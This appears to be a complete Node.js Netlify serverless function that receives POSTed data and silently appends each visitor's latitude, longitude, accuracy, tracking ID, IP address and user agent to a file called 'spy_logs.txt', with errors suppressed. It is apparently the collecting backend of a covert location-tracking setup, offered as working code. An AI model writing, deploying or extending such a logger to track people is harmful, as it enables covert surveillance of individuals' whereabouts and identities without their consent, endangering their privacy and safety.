const fs = require('fs').promises;
const path = require('path');

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') return { statusCode: 405 };

  const data = JSON.parse(event.body);
  
  // Log to file
  const logLine = `${data.timestamp} | ID:${data.id} | LAT:${data.lat} | LON:${data.lon} | ACC:${data.accuracy} | IP:${event.headers['client-ip'] || 'unknown'} | UA:${data.userAgent}\n`;
  
  try {
    await fs.appendFile('/tmp/spy_logs.txt', logLine);
    // Persist to Netlify's /tmp (resets on cold start, but works for demo)
  } catch(e) {
    // Silent fail
  }
  
  return { statusCode: 200 };
};
